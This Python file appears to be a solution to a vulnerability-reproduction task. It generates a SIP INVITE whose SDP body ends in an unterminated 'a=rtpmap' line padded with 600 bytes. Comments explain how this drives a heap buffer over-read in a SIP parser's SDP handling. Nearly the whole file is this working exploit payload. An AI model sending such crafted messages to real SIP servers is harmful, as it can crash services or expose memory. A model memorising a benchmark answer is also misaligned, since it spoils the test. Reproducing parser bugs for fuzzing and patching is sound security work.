import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in core: parser/sdp.
        The vulnerability allows out-of-bounds access when parsing SDP values without
        verifying if the pointer is still within the buffer boundaries.
        """
        
        # Construct the SIP headers
        # Minimal headers required to route the message to the SDP parser
        headers = (
            b"INVITE sip:service@127.0.0.1 SIP/2.0\r\n"
            b"Via: SIP/2.0/UDP 127.0.0.1:5060;branch=z9hG4bK1234\r\n"
            b"Max-Forwards: 70\r\n"
            b"From: <sip:attacker@127.0.0.1>;tag=poc\r\n"
            b"To: <sip:service@127.0.0.1>\r\n"
            b"Call-ID: 1234567890@127.0.0.1\r\n"
            b"CSeq: 1 INVITE\r\n"
            b"Contact: <sip:attacker@127.0.0.1>\r\n"
            b"Content-Type: application/sdp\r\n"
        )
        
        # Construct the SDP body
        # Start with standard mandatory SDP fields to ensure parsing state progresses
        sdp_lines = [
            b"v=0",
            b"o=attacker 1000 1000 IN IP4 127.0.0.1",
            b"s=PoC-Session",
            b"c=IN IP4 127.0.0.1",
            b"t=0 0",
            b"m=audio 1234 RTP/AVP 0"
        ]
        
        # Join valid lines with CRLF
        sdp_content = b"\r\n".join(sdp_lines) + b"\r\n"
        
        # The Vulnerability Trigger:
        # Append an attribute line that does NOT end with CRLF and contains no whitespace.
        # The vulnerable parser code loops scanning for a delimiter (CR, LF, or space)
        # but fails to check if it has reached the end of the buffer ('end' pointer).
        # By extending this string to the very end of the declared Content-Length,
        # we force the loop to read past the allocated buffer.
        
        # We use a reasonably long string to bypass small buffer optimizations and ensure
        # the read goes into unmapped memory or hits an ASAN redzone.
        trigger_line = b"a=rtpmap:0 " + b"A" * 600
        
        full_body = sdp_content + trigger_line
        
        # Append Content-Length header and the body
        # It is critical that Content-Length matches exactly so the buffer ends right after 'trigger_line'
        final_message = headers + f"Content-Length: {len(full_body)}\r\n\r\n".encode() + full_body
        
        return final_message